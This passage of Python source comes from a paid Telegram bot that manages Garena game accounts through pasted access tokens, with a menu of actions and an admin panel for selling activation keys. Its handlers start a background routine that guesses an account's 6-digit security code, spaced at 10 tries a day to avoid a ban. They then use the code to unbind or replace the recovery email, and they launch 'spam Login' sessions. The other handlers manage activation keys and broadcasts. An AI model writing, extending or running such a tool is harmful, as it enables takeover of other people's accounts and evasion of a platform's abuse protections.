        f"{lbl_current} <code>{email or 'None'}</code>\n"
        f"{lbl_pending} <code>{pending or 'None'}</code>\n"
        f"{lbl_remaining} <b>{convert_seconds(countdown, lang) if pending else 'None'}</b>\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"✨ {opt_lbl}"
    )
    
    await smart_edit(query, msg, make_acc_control_keyboard(lang, aid, is_active_for_this, is_guessing_for_this, is_daily_limit))

# ============================================================
# TEXT INPUT STATE MACHINE
# ============================================================
async def handle_text_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    state = context.user_data.get("state")
    text = update.message.text.strip()
    lang = DataManager.get_user_lang(user_id)
    is_admin = DataManager.is_admin(user_id)

    if state == "awaiting_subscription":
        # التحقق من الاشتراك مرة أخرى
        channel_config = get_channel_config()
        channel_username = channel_config.get("channel_username", "")
        is_subscribed = await check_user_subscription(context.bot, user_id, channel_username)
        if is_subscribed:
            context.user_data["state"] = None
            await update.message.reply_html(get_txt("subscription_success", lang))
            # متابعة للخطوة التالية
            if not check_user_key(user_id):
                context.user_data["state"] = "awaiting_activation_key"
                keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📞 شراء تفعيل / Buy Key", url=f"https://t.me/{DEV_USER}")]])
                await update.message.reply_html(get_txt("welcome_unregistered", lang), reply_markup=keyboard)
            else:
                await update.message.reply_html(get_txt("welcome_back", lang), reply_markup=make_user_menu(lang, is_admin))
        else:
            await update.message.reply_html(get_txt("subscription_failed", lang))
        return

    if state == "awaiting_activation_key":
        success, msg_info = validate_key(text, user_id)
        if success:
            context.user_data["state"] = None
            await update.message.reply_html(
                get_txt("key_activated", lang),
                reply_markup=make_user_menu(lang, is_admin)
            )
        else:
            await update.message.reply_html(get_txt("invalid_key", lang))
        return

    if state == "adm_awaiting_channel_username":
        context.user_data["state"] = None
        # تنظيف اسم القناة
        channel_username = text.replace("@", "").replace("https://t.me/", "").replace("http://t.me/", "").strip()
        
        if channel_username.lower() in ["none", "off", "clear", "remove", "delete", "حذف", "إلغاء"]:
            # حذف القناة
            save_channel_config({})
            await update.message.reply_html(get_txt("channel_cleared", lang), reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        else:
            # حفظ القناة
            config = {"channel_username": channel_username}
            save_channel_config(config)
            await update.message.reply_html(
                get_txt("channel_set_success", lang).format(channel=channel_username),
                reply_markup=make_admin_menu(lang, user_id == OWNER_ID)
            )
        return

    if state == "adm_awaiting_custom_text":
        context.user_data["state"] = None
        key = context.user_data.get("edit_text_key")
        edit_lang = context.user_data.get("edit_text_lang", lang)
        if not key:
            await update.message.reply_html("❌ خطأ في المفتاح" if lang == LANG_AR else "❌ Key error")
            return

        data = load_custom_texts()
        if edit_lang not in data:
            data[edit_lang] = {}
        data[edit_lang][key] = text
        save_custom_texts(data)

        success_msg = (
            f"✅ <b>تم حفظ النص بنجاح!</b>\n\nالمفتاح: <code>{key}</code>\n\nيمكنك تجربته الآن من لوحة المستخدم."
            if lang == LANG_AR else
            f"✅ <b>Text saved successfully!</b>\n\nKey: <code>{key}</code>\n\nYou can try it from the user menu now."
        )
        await update.message.reply_html(success_msg, reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        return

    if state == "awaiting_eat_input":
        context.user_data["state"] = None
        loading_msg = await update.message.reply_html(get_txt("loading_verification", lang))
        error, data = await garena.eat_to_token(text)
        if error:
            err_lbl = "فشل إضافة الحساب:" if lang == LANG_AR else "Failed to add account:"
            await loading_msg.edit_text(f"❌ <b>{err_lbl}</b>\n{error}", parse_mode="HTML")
            return
        
        DataManager.save_garena_account(
            user_id=user_id,
            account_id=data["account_id"],
            nickname=data["nickname"],
            region=data["region"],
            access_token=data["access_token"],
            eat_token=text
        )
        
        success_msg = get_txt("acc_added", lang).format(
            name=data['nickname'],
            aid=data['account_id'],
            region=data['region']
        )
        await loading_msg.edit_text(success_msg, parse_mode="HTML", reply_markup=make_user_menu(lang, is_admin))
        return

    if state == "awaiting_unbind_email":
        email = text.strip()
        if "@" not in email:
            err = "❌ صيغة بريد إلكتروني غير صحيحة! أرسل البريد بشكل صحيح:" if lang == LANG_AR else "❌ Invalid email format! Please send a valid email:"
            await update.message.reply_html(err)
            return
        context.user_data["unbind_email"] = email
        context.user_data["state"] = "awaiting_unbind_sec_code"
        prompt = (
            "🔓 <b>تم حفظ البريد.</b>\n\nيرجى إرسال <b>كود الحماية</b> المكون من 6 أرقام لتأكيد هويتك وبدء فك الربط:"
            if lang == LANG_AR else
            "🔓 <b>Email saved.</b>\n\nPlease send the 6-digit <b>security code</b> to confirm identity and start unbinding:"
        )
        await update.message.reply_html(prompt)
        return

    if state == "awaiting_unbind_sec_code":
        context.user_data["state"] = None
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        if not acc_data:
            await update.message.reply_html(get_txt("acc_not_found", lang))
            return
            
        email = context.user_data.get("unbind_email")
        if not email:
            await update.message.reply_html("❌ لم يتم إدخال البريد الإلكتروني. أعد المحاولة من البداية." if lang == LANG_AR else "❌ Email not provided. Please start over.")
            return

        success, msg, identity_token = await garena.verify_identity_sec(email, acc_data["ACCESS_TOKEN"], text)
        
        if not success or not identity_token:
            msg_resp = garena.format_api_text(msg, "التحقق من الهوية بكود الحماية", "Verify Identity with Sec Code", lang)
            await update.message.reply_html(f"❌ {msg_resp}", reply_markup=make_user_menu(lang, is_admin))
            return
            
        ok, resp_msg = await garena.create_unbind_request(acc_data["ACCESS_TOKEN"], identity_token)
        msg_resp = garena.format_api_text(resp_msg, "طلب فك ربط الإيميل", "Create Unbind Request", lang)
        await update.message.reply_html(msg_resp, reply_markup=make_user_menu(lang, is_admin))
        return

    if state == "awaiting_rebind_email":
        email = text.strip()
        if "@" not in email:
            err = "❌ صيغة بريد إلكتروني غير صحيحة! أرسل البريد بشكل صحيح:" if lang == LANG_AR else "❌ Invalid email format! Please send a valid email:"
            await update.message.reply_html(err)
            return
        context.user_data["rebind_current_email"] = email
        context.user_data["state"] = "awaiting_rebind_sec_code"
        prompt = (
            "🔄 <b>تم حفظ البريد الحالي.</b>\n\nيرجى إرسال <b>كود الحماية</b> المكون من 6 أرقام لتأكيد هويتك:"
            if lang == LANG_AR else
            "🔄 <b>Current email saved.</b>\n\nPlease send the 6-digit <b>security code</b> to confirm identity:"
        )
        await update.message.reply_html(prompt)
        return

    if state == "awaiting_rebind_sec_code":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        if not acc_data:
            context.user_data["state"] = None
            await update.message.reply_html(get_txt("acc_not_found", lang))
            return
            
        email = context.user_data.get("rebind_current_email")
        if not email:
            context.user_data["state"] = None
            await update.message.reply_html("❌ لم يتم إدخال البريد الإلكتروني. أعد المحاولة من البداية." if lang == LANG_AR else "❌ Email not provided. Please start over.")
            return

        success, msg, identity_token = await garena.verify_identity_sec(email, acc_data["ACCESS_TOKEN"], text)
        
        if not success or not identity_token:
            context.user_data["state"] = None
            msg_resp = garena.format_api_text(msg, "التحقق من الهوية بكود الحماية", "Verify Identity with Sec Code", lang)
            await update.message.reply_html(f"❌ {msg_resp}", reply_markup=make_user_menu(lang, is_admin))
            return
            
        context.user_data["rebind_identity_token"] = identity_token
        context.user_data["state"] = "awaiting_rebind_new_email"
        await update.message.reply_html("🟢 <b>تم التحقق من الهوية بنجاح!</b>\n\nيرجى إرسال <b>البريد الإلكتروني الجديد</b> الذي ترغب في ربطه بهذا الحساب:")
        return

    if state == "awaiting_guess_email":
        email = text.strip()
        if "@" not in email:
            err = "❌ صيغة بريد إلكتروني غير صحيحة! أرسل البريد بشكل صحيح:" if lang == LANG_AR else "❌ Invalid email format! Please send a valid email:"
            await update.message.reply_html(err)
            return

        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        if not acc_data:
            context.user_data["state"] = None
            await update.message.reply_html(get_txt("acc_not_found", lang))
            return

        # حفظ البريد في بيانات الحساب واستخدامه في التخمين
        users = DataManager.get_users()
        users[str(user_id)]["accounts"][str(target_account_id)]["recovery_email"] = email
        users[str(user_id)]["accounts"][str(target_account_id)]["guessing_active"] = True
        users[str(user_id)]["accounts"][str(target_account_id)].setdefault("pin_index", 0)
        users[str(user_id)]["accounts"][str(target_account_id)].setdefault("guesses_today_count", 0)
        users[str(user_id)]["accounts"][str(target_account_id)].setdefault("last_guess_date", "")
        DataManager.save_users(users)

        context.user_data["state"] = None
        asyncio.create_task(run_guessing_for_account(context.bot, str(user_id), str(target_account_id)))

        success_msg = (
            f"🧠 <b>تم بدء التخمين الذكي بنجاح!</b>\n\n"
            f"👤 الحساب: <b>{acc_data.get('NAME', '')}</b>\n"
            f"📧 البريد المستخدم: <code>{email}</code>\n\n"
            f"سيتم تجربة 10 رموز يومياً بفواصل آمنة في الخلفية."
            if lang == LANG_AR else
            f"🧠 <b>Smart guessing started successfully!</b>\n\n"
            f"👤 Account: <b>{acc_data.get('NAME', '')}</b>\n"
            f"📧 Email used: <code>{email}</code>\n\n"
            f"Will try 10 codes per day with safe intervals in the background."
        )
        await update.message.reply_html(success_msg, reply_markup=make_user_menu(lang, is_admin))
        return

    if state == "awaiting_rebind_new_email":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        new_email = text
        if "@" not in new_email:
            await update.message.reply_html("❌ صيغة بريد إلكتروني غير صحيحة! يرجى الإرسال بشكل صحيح:")
            return
            
        context.user_data["rebind_new_email"] = new_email
        context.user_data["state"] = "awaiting_rebind_otp"
        
        success, msg = await garena.send_otp(new_email, acc_data["ACCESS_TOKEN"])
        msg_resp = garena.format_api_text(msg, "إرسال كود الـ OTP للبريد الجديد", "Sending OTP to new email", lang)
        await update.message.reply_html(f"📥 <b>{msg_resp}</b>\n\nيرجى كتابة رمز التحقق (OTP) المرسل للبريد الإلكتروني الجديد الآن لتأكيد عملية التغيير:")
        return

    if state == "awaiting_rebind_otp":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        new_email = context.user_data.get("rebind_new_email")
        identity_token = context.user_data.get("rebind_identity_token")
        
        success, msg, verifier_token = await garena.verify_otp(new_email, acc_data["ACCESS_TOKEN"], text)
        if not success or not verifier_token:
            context.user_data["state"] = None
            msg_resp = garena.format_api_text(msg, "التحقق من رمز OTP", "Verify OTP", lang)
            await update.message.reply_html(f"❌ {msg_resp}", reply_markup=make_user_menu(lang, is_admin))
            return
            
        context.user_data["state"] = None
        ok, resp_msg = await garena.create_rebind_request(acc_data["ACCESS_TOKEN"], identity_token, new_email, verifier_token)
        msg_resp = garena.format_api_text(resp_msg, "طلب تغيير البريد النهائي", "Create Rebind Request", lang)
        await update.message.reply_html(msg_resp, reply_markup=make_user_menu(lang, is_admin))
        return

    if state == "awaiting_bind_email_input":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        if not acc_data:
            await update.message.reply_html(get_txt("acc_not_found", lang))
            return
        
        email = text
        if "@" not in email:
            err_email_lbl = "❌ صيغة بريد إلكتروني غير صحيحة!" if lang == LANG_AR else "❌ Invalid email format!"
            await update.message.reply_html(err_email_lbl)
            return
        
        context.user_data["bind_email_address"] = email
        context.user_data["state"] = "awaiting_bind_otp"
        success, msg = await garena.send_otp(email, acc_data["ACCESS_TOKEN"])
        
        msg_resp = garena.format_api_text(msg, "إرسال كود الـ OTP", "Sending OTP Code", lang)
        prompt_lbl = "يرجى كتابة رمز التحقق (OTP) المرسل لبريدك الإلكتروني الآن:" if lang == LANG_AR else "Please send the verification OTP sent to your email now:"
        await update.message.reply_html(f"📥 <b>{msg_resp}</b>\n\n{prompt_lbl}")
        return

    if state == "awaiting_bind_otp":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        email = context.user_data.get("bind_email_address")
        
        success, msg, verifier = await garena.verify_otp(email, acc_data["ACCESS_TOKEN"], text)
        if not success or not verifier:
            msg_resp = garena.format_api_text(msg, "التحقق من الكود", "Verify Code", lang)
            await update.message.reply_html(f"❌ {msg_resp}")
            context.user_data["state"] = None
            return
            
        context.user_data["bind_verifier_token"] = verifier
        context.user_data["state"] = "awaiting_bind_sec_code"
        prompt_lbl = "🔑 تم التحقق بنجاح! أدخل كود الحماية المكون من 6 أرقام لتأكيد عملية الربط:" if lang == LANG_AR else "🔑 Verified! Send the 6-digit security code to confirm binding:"
        await update.message.reply_html(prompt_lbl)
        return

    if state == "awaiting_bind_sec_code":
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        email = context.user_data.get("bind_email_address")
        verifier = context.user_data.get("bind_verifier_token")
        
        sec_code = text
        if len(sec_code) != 6 or not sec_code.isdigit():
            err_sec_lbl = "❌ كود الأمان يجب أن يتكون من 6 أرقام رقمية فقط!" if lang == LANG_AR else "❌ Security code must be exactly 6 numeric digits!"
            await update.message.reply_html(err_sec_lbl)
            return
            
        context.user_data["state"] = None
        success, msg = await garena.create_bind_request(email, acc_data["ACCESS_TOKEN"], verifier, sec_code)
        
        msg_resp = garena.format_api_text(msg, "طلب الربط النهائي", "Final Bind Request", lang)
        await update.message.reply_html(msg_resp, reply_markup=make_user_menu(lang, is_admin))
        return

    if state == "awaiting_long_bio_text":
        context.user_data["state"] = None
        target_account_id = context.user_data.get("ctrl_account_id")
        accounts = DataManager.get_users().get(str(user_id), {}).get("accounts", {})
        acc_data = accounts.get(str(target_account_id))
        
        loading_lbl = "⏳ جاري تحديث التوقيع..." if lang == LANG_AR else "⏳ Updating profile bio..."
        loading_msg = await update.message.reply_html(loading_lbl)
        success, msg = await garena.set_long_bio(text, acc_data["ACCESS_TOKEN"])
        
        btn = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع لوحة التحكم", callback_data=f"ctrl_acc_{target_account_id}")]])
        if success:
            success_lbl = get_txt("long_bio_success", lang).format(text=text)
            await loading_msg.edit_text(success_lbl, parse_mode="HTML", reply_markup=btn)
        else:
            fail_lbl = "فشلت عملية تحديث التوقيع" if lang == LANG_AR else "Failed to update profile bio"
            await loading_msg.edit_text(f"❌ <b>{fail_lbl}</b>:\n{msg}", parse_mode="HTML", reply_markup=btn)
        return

    if state == "adm_awaiting_key_duration":
        try:
            parts = text.split()
            val, unit = int(parts[0]), parts[1].lower()
            if unit in ["hour", "hours", "hr", "h"]: unit = "hours"
            elif unit in ["day", "days", "d"]: unit = "days"
            else: raise ValueError
            context.user_data["adm_val"] = val
            context.user_data["adm_unit"] = unit
            context.user_data["state"] = "adm_awaiting_key_devices"
            prompt_lbl = f"⏰ المدة المحددة: <b>{val} {unit}</b>\n\nأدخل الآن الحد الأقصى للأجهزة (افتراضي: {MAX_DEVICES_DEFAULT}):" if lang == LANG_AR else f"⏰ Duration: <b>{val} {unit}</b>\n\nEnter max allowed devices (default: {MAX_DEVICES_DEFAULT}):"
            await update.message.reply_html(prompt_lbl)
        except:
            err_dur = "❌ تنسيق خاطئ! أرسل مثل: <code>24 hours</code> أو <code>7 days</code>" if lang == LANG_AR else "❌ Wrong format! Send like: <code>24 hours</code> or <code>7 days</code>"
            await update.message.reply_html(err_dur)
        return

    if state == "adm_awaiting_key_devices":
        try:
            max_dev = int(text) if text.strip() else MAX_DEVICES_DEFAULT
            val = context.user_data.get("adm_val")
            unit = context.user_data.get("adm_unit")
            key_data = KeyManager.create(val, unit, max_dev, user_id)
            KeyManager.save(key_data)
            context.user_data["state"] = None
            
            success_lbl = (
                f"✅ <b>تم توليد المفتاح بنجاح!</b>\n\n"
                f"🔑 <code>{key_data['key']}</code>\n"
                f"⏰ المدة: <b>{val} {unit}</b>\n"
                f"👥 الأجهزة: <b>{max_dev}</b>"
            ) if lang == LANG_AR else (
                f"✅ <b>Key Generated Successfully!</b>\n\n"
                f"🔑 <code>{key_data['key']}</code>\n"
                f"⏰ Lifetime: <b>{val} {unit}</b>\n"
                f"👥 Max Devices: <b>{max_dev}</b>"
            )
            await update.message.reply_html(success_lbl, reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        except Exception as e:
            await update.message.reply_html(f"❌ Error: {e}")
        return

    if state == "adm_awaiting_batch_count":
        try:
            count = int(text)
            if count <= 0: raise ValueError
            context.user_data["adm_batch_count"] = count
            context.user_data["state"] = "adm_awaiting_batch_duration"
            prompt = f"🔢 العدد المطلوب: <b>{count} مفتاح</b>\n\nأدخل الآن مدة هذه الدفعة (مثال: <code>24 hours</code> أو <code>30 days</code>):" if lang == LANG_AR else f"🔢 Requested Count: <b>{count} keys</b>\n\nEnter the batch lifetime duration (e.g. <code>24 hours</code> or <code>30 days</code>):"
            await update.message.reply_html(prompt)
        except:
            await update.message.reply_html("❌ يرجى إدخال عدد صحيح أكبر من الصفر!")
        return

    if state == "adm_awaiting_batch_duration":
        try:
            parts = text.split()
            val, unit = int(parts[0]), parts[1].lower()
            if unit in ["hour", "hours", "hr", "h"]: unit = "hours"
            elif unit in ["day", "days", "d"]: unit = "days"
            else: raise ValueError
            context.user_data["adm_batch_val"] = val
            context.user_data["adm_batch_unit"] = unit
            context.user_data["state"] = "adm_awaiting_batch_devices"
            prompt = f"⏰ المدة المحددة للدفعة: <b>{val} {unit}</b>\n\nأدخل الآن الحد الأقصى للأجهزة للمفاتيح (افتراضي: {MAX_DEVICES_DEFAULT}):" if lang == LANG_AR else f"⏰ Selected Duration: <b>{val} {unit}</b>\n\nEnter max allowed devices for these keys (default: {MAX_DEVICES_DEFAULT}):"
            await update.message.reply_html(prompt)
        except:
            await update.message.reply_html("❌ تنسيق خاطئ! أرسل مثل: <code>24 hours</code> أو <code>7 days</code>")
        return

    if state == "adm_awaiting_batch_devices":
        try:
            max_dev = int(text) if text.strip() else MAX_DEVICES_DEFAULT
            count = context.user_data.get("adm_batch_count")
            val = context.user_data.get("adm_batch_val")
            unit = context.user_data.get("adm_batch_unit")
            
            generated_keys = []
            for _ in range(count):
                key_data = KeyManager.create(val, unit, max_dev, user_id)
                KeyManager.save(key_data)
                generated_keys.append(key_data["key"])
            
            context.user_data["state"] = None
            keys_list = "\n".join([f"<code>{k}</code>" for k in generated_keys])
            
            success_msg = (
                f"📦 <b>تم توليد دفعة المفاتيح بنجاح!</b>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"🔢 عدد المفاتيح: <b>{count}</b>\n"
                f"⏰ الصلاحية: <b>{val} {unit}</b>\n"
                f"👥 الأجهزة: <b>{max_dev}</b>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"<b>قائمة المفاتيح المولدة:</b>\n{keys_list}"
            ) if lang == LANG_AR else (
                f"📦 <b>Batch Keys Generated Successfully!</b>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"🔢 Total Keys: <b>{count}</b>\n"
                f"⏰ Duration: <b>{val} {unit}</b>\n"
                f"👥 Devices: <b>{max_dev}</b>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
                f"<b>Keys List:</b>\n{keys_list}"
            )
            await update.message.reply_html(success_msg, reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        except Exception as e:
            await update.message.reply_html(f"❌ خطأ: {e}")
        return

    if state == "adm_awaiting_disable_key_code":
        context.user_data["state"] = None
        if KeyManager.disable(text):
            success_msg = f"✅ تم تعطيل وإيقاف المفتاح <code>{text}</code> بنجاح من قاعدة البيانات." if lang == LANG_AR else f"✅ Key <code>{text}</code> has been disabled successfully."
            await update.message.reply_html(success_msg, reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        else:
            fail_msg = "❌ لم نجد هذا المفتاح في قاعدة البيانات!" if lang == LANG_AR else "❌ Key not found in database!"
            await update.message.reply_html(fail_msg, reply_markup=make_admin_menu(lang, user_id == OWNER_ID))
        return

    if state == "adm_awaiting_kick_id":
        try:
            target_id = int(text)
            context.user_data["state"] = None
            if KeyManager.remove_user_from_all_keys(target_id):
                await update.message.reply_html(get_txt("kick_success", lang).format(target_id=target_id))
            else:
                err_kick = "❌ لم نجد هذا العضو مرتبطاً بأي مفتاح!" if lang == LANG_AR else "❌ This user id has no active registration!"
                await update.message.reply_html(err_kick)
        except:
            await update.message.reply_html("❌ Enter valid User ID!")
        return

    if state == "adm_awaiting_admin_id" and user_id == OWNER_ID:
        try:
            target_id = int(text)
            context.user_data["state"] = None
            if DataManager.promote_to_admin(target_id):
                await update.message.reply_html(get_txt("admin_added_success", lang).format(target_id=target_id))
            else:
                await update.message.reply_html("❌ Fail to find target user.")
        except:
            await update.message.reply_html("❌ Enter valid User ID!")
        return

    if state == "adm_awaiting_broadcast_text":
        context.user_data["state"] = None
        users = DataManager.get_users()
        sent = 0
        for uid in users:
            try:
                await context.bot.send_message(
                    chat_id=int(uid),
                    text=f"📢 <b>Broadcast Announcement:</b>\n\n{text}",
                    parse_mode="HTML"
                )
                sent += 1
                await asyncio.sleep(0.05)
            except:
                pass
        await update.message.reply_html(get_txt("broadcast_success", lang).format(sent=sent))
        return

    await update.message.reply_html("⚠️ Command unrecognized.")

# ============================================================
# SMART INTERACTIVE CALLBACK HANDLERS
# ============================================================
async def handle_callback_queries(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    
    try:
        await query.answer()
    except Exception:
        pass
        
    user_id = update.effective_user.id
    lang = DataManager.get_user_lang(user_id)
    is_admin = DataManager.is_admin(user_id)
    data = query.data

    if data == "check_subscription":
        channel_config = get_channel_config()
        channel_username = channel_config.get("channel_username", "")
        is_subscribed = await check_user_subscription(context.bot, user_id, channel_username)
        
        if is_subscribed:
            await query.answer("✅ تم التحقق من اشتراكك!" if lang == LANG_AR else "✅ Subscription verified!", show_alert=True)
            # متابعة للخطوة التالية
            if not check_user_key(user_id):
                context.user_data["state"] = "awaiting_activation_key"
                keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📞 شراء تفعيل / Buy Key", url=f"https://t.me/{DEV_USER}")]])
                await smart_edit(query, get_txt("welcome_unregistered", lang), keyboard)
            else:
                await smart_edit(query, get_txt("welcome_back", lang), make_user_menu(lang, is_admin))
        else:
            await query.answer("❌ لم تشترك بعد!" if lang == LANG_AR else "❌ Not subscribed yet!", show_alert=True)
        return

    if data == "btn_goto_home":
        await smart_edit(query, get_txt("welcome_back", lang), make_user_menu(lang, is_admin))
        return

    if data == "btn_change_lang":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar"),
             InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")]
        ])
        await smart_edit(query, get_txt("choose_lang", lang), keyboard)
        return

    if data.startswith("lang_"):
        new_lang = data.split("_")[1]
        DataManager.set_user_lang(user_id, new_lang)
        await smart_edit(query, get_txt("lang_saved", new_lang), make_user_menu(new_lang, is_admin))
        return

    if data == "btn_contact":
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home")]])
        await smart_edit(query, get_txt("contact_us_text", lang), keyboard)
        return

    if data == "btn_help":
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_goto_home")]])
        await smart_edit(query, get_txt("help_text", lang), keyboard)
        return

    if data.startswith("op_start_login_"):
        aid = data.split("_")[3]
        u_info = DataManager.get_users().get(str(user_id), {})
        acc_data = u_info.get("accounts", {}).get(aid)
        if not acc_data:
            try:
                await query.answer("❌ لم يتم العثور على الحساب!", show_alert=True)
            except:
                pass
            return
            
        eat_token = acc_data.get("EAT") or acc_data.get("ACCESS_TOKEN")
        error, token_data = await garena.eat_to_token(eat_token)
        
        if error:
            access_token = acc_data.get("ACCESS_TOKEN")
        else:
            access_token = token_data.get("access_token")
            DataManager.save_garena_account(
                user_id=user_id,
                account_id=acc_data["ID"],
                nickname=token_data["nickname"],
                region=token_data["region"],
                access_token=access_token,
                eat_token=eat_token
            )
            
        success, result = await spam_manager.start_login_session(access_token, account_id=aid)
        if success:
            alert_msg = f"🚀 [R32] تم تفعيل سبام Login بنجاح لحساب {acc_data['NAME']}! الجلسات تدور الآن بالخلفية بجودة واستقرار."
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
        else:
            alert_msg = f"❌ فشل تشغيل سبام جارينا: {result}"
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
            
        await show_account_control_view(query, user_id, aid, context)
        return

    if data.startswith("op_stop_login_"):
        aid = data.split("_")[3]
        success, msg = await spam_manager.stop_login_session(aid)
        if success:
            alert_msg = "⏹️ تم إيقاف جلسة السبام بنجاح لهذا الحساب!"
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
        else:
            alert_msg = "⚠️ لا توجد جلسة نشطة لإيقافها لهذا الحساب!"
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
            
        await show_account_control_view(query, user_id, aid, context)
        return

    if data.startswith("op_start_guess_"):
        aid = data.split("_")[3]
        u_info = DataManager.get_users().get(str(user_id), {})
        acc_data = u_info.get("accounts", {}).get(aid)
        if not acc_data:
            try:
                await query.answer("❌ لم يتم العثور على الحساب!", show_alert=True)
            except:
                pass
            return

        # اطلب البريد الإلكتروني من المستخدم بدلاً من الاعتماد على get_bind_info
        context.user_data["state"] = "awaiting_guess_email"
        context.user_data["ctrl_account_id"] = aid
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية" if lang == LANG_AR else "❌ Cancel", callback_data=f"ctrl_acc_{aid}")]])
        prompt = (
            "🧠 <b>بدء التخمين الذكي لرمز الأمان</b>\n\n"
            "يرجى إرسال <b>البريد الإلكتروني</b> المربوط حالياً بهذا الحساب لبدء عملية التخمين:"
            if lang == LANG_AR else
            "🧠 <b>Start Smart PIN Guessing</b>\n\n"
            "Please send the <b>email address</b> currently linked to this account to start guessing:"
        )
        await smart_edit(query, prompt, keyboard)
        return

    if data.startswith("op_stop_guess_"):
        aid = data.split("_")[3]
        users = DataManager.get_users()
        if str(user_id) in users and aid in users[str(user_id)]["accounts"]:
            users[str(user_id)]["accounts"][aid]["guessing_active"] = False
            DataManager.save_users(users)

        alert_msg = "⏹️ تم إيقاف التخمين الذكي للحساب بنجاح."
        try:
            await query.answer(alert_msg, show_alert=True)
        except:
            pass
        await show_account_control_view(query, user_id, aid, context)
        return

    if data == "op_daily_limit_alert":
        alert_msg = "⏳ لقد تم استهلاك الحد اليومي المسموح به (10 محاولات) لحماية هذا الحساب من البان. انتظر 24 ساعة ليعود العمل تلقائياً."
        try:
            await query.answer(alert_msg, show_alert=True)
        except:
            pass
        return

    if data == "op_unbind_email":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        # اطلب البريد من المستخدم بدل الاعتماد على get_bind_info
        context.user_data["state"] = "awaiting_unbind_email"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية" if lang == LANG_AR else "❌ Cancel", callback_data=f"ctrl_acc_{aid}")]])
        prompt = (
            "🔓 <b>فك ربط البريد الإلكتروني:</b>\n\n"
            "يرجى إرسال <b>البريد الإلكتروني</b> المربوط حالياً بهذا الحساب:"
            if lang == LANG_AR else
            "🔓 <b>Unbind Recovery Email:</b>\n\n"
            "Please send the <b>email address</b> currently linked to this account:"
        )
        await smart_edit(query, prompt, keyboard)
        return

    if data == "op_change_email":
        aid = context.user_data.get("ctrl_account_id")
        acc = DataManager.get_users().get(str(user_id), {}).get("accounts", {}).get(str(aid))
        if not acc:
            try:
                await query.answer("⚠️ الجلسة منتهية. يرجى فتح الحساب مجدداً من قائمة الحسابات.", show_alert=True)
            except:
                pass
            return
            
        # اطلب البريد الحالي من المستخدم بدل الاعتماد على get_bind_info
        context.user_data["state"] = "awaiting_rebind_email"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية" if lang == LANG_AR else "❌ Cancel", callback_data=f"ctrl_acc_{aid}")]])
        prompt = (
            "🔄 <b>تغيير البريد الإلكتروني:</b>\n\n"
            "يرجى إرسال <b>البريد الإلكتروني الحالي</b> المربوط بهذا الحساب:"
            if lang == LANG_AR else
            "🔄 <b>Change Email Address:</b>\n\n"
            "Please send the <b>current email address</b> linked to this account:"
        )
        await smart_edit(query, prompt, keyboard)
        return

    if data == "op_check_platforms":
        try:
            await query.answer("⚠️ هذه الميزة غير متوفرة حالياً في هذا الإصدار!", show_alert=True)
        except:
            pass
        return

    if data == "btn_add_acc":
        context.user_data["state"] = "awaiting_eat_input"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية" if lang == LANG_AR else "❌ Cancel", callback_data="btn_goto_home")]])
        await smart_edit(query, get_txt("enter_eat", lang), keyboard)
        return

    if data == "btn_my_accs":
